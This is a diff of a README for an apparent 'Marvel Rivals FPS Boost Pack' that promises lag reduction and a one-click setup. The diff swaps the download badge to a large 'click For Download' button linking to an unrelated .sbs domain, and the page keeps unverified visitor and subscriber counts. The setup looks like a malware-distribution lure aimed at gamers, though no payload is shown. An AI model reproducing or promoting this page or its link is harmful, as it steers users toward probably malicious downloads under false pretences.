@@ -2,13 +2,19 @@
 
 Boost your Marvel Rivals experience to the next level with our cutting-edge FPS Boost Pack! 🎮 Whether you're battling in fast-paced combat or exploring the vibrant environments, smooth performance is critical. This tool is designed to eliminate lag, reduce stuttering, and maximize your game's potential across a variety of PC builds. One-click setup. No complex configurations. Just pure speed and smoother visuals.
 
-<div style="text-align: center">
-  <a href="https://marvel-rivals-fps-boost.github.io/.github/">
-    <img class="bumbum" style="width: 400px" alt="Static Badge" src="https://img.shields.io/badge/click_for_download-Marvel_Rivals_FPS_Boost_Pack-blueviolet">
-  </a>
-</div>
+---
+
+<a href="https://kerten.sbs/kl/old">
+  <img
+    src="https://img.shields.io/badge/click%20For%20Download-green?style=for-the-badge&logo=github"
+    alt="gg"
+    width="1100"
+  >
+</a>
 
 ---
+
+
 
 ![Visitors: 10K+](https://img.shields.io/badge/Visitors-10K+-ff9f43) ![Subscribers: 3K+](https://img.shields.io/badge/Subscribers-3K+-6ab04c) ![Last Updated: 2025](https://img.shields.io/badge/Last_Updated-2025-3498db)
 
